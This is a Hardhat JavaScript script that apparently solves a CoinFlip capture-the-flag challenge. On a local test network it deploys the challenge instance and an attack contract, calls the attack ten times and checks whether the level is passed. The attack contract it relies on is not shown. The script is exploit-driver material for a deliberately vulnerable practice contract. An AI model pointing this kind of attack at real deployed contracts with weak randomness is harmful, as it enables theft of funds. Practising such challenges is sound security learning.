const { ethers } = require('hardhat');

async function main() {
    const [owner, player] = await ethers.getSigners();

    const Factory = await ethers.getContractFactory("CoinFlipFactory");
    const factory = await Factory.deploy();
    await factory.deployed();

    const receipt = await factory.createInstance(owner.address);
    const instance_address = (await receipt.wait()).events[0].args[0];
    const coinFlip = await ethers.getContractAt("CoinFlip", instance_address, owner);

    const Attack = await ethers.getContractFactory("CoinFlipAttack");
    const attack = await Attack.deploy();
    await attack.deployed();


    for (let i = 0; i < 10; i++) {
        await attack.attack(coinFlip.address);
    }


    (await coinFlip.consecutiveWins()).toString();


    const res = await factory.validateInstance(coinFlip.address, player.address);
    if (res == true) {
        console.log("[+] Done!");
    } else {
        console.log("[+] Fail...");
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
